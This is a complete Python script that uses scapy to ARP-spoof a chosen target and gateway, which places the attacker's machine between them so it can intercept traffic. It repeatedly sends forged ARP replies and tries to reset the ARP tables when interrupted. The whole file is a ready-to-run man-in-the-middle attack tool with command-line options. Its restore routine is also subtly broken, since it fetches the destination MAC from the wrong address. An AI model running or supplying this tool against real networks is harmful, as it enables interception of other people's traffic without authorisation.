#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse

def get_arguments():

	parser = optparse.OptionParser()
	parser.add_option("-t", "--target", dest="t", help="TARGET TO SPOOF.,")
	parser.add_option("-s", "--source", dest="s", help="ADREESS TO SPOOF TO.")
	(options, arguments) =  parser.parse_args()

	return options

def get_mac(ip):
	arp_req = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_req_broadcast = broadcast/arp_req
	answerd_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]

	return answerd_list[0][1].hwsrc

def get_ip(ip):
	arp_req = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_req_broadcast = broadcast/arp_req
	answerd_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]

	return answerd_list[0][1].psrc


def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet  = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)

def restore_to_norm(dest_ip, source_ip):
	dest_mac = get_mac(source_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, count=4 ,verbose=False,)

packet_sent_count = 0

options = get_arguments()
target_ip = get_ip(options.t)
gateway_ip = get_ip(options.s)

try:
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		packet_sent_count = packet_sent_count + 2
		print("\r\033[1;32;40m[+]Packets sent: " + str(packet_sent_count)),
		sys.stdout.flush()
		time.sleep(2)
except KeyboardInterrupt:
	print("\n\033[1;34;40m[-] Detected CNTL C. RESSETING ARP TABLES BACK TO NORMAL......")
	restore_to_norm(target_ip, gateway_ip)
	restore_to_norm(gateway_ip, target_ip)

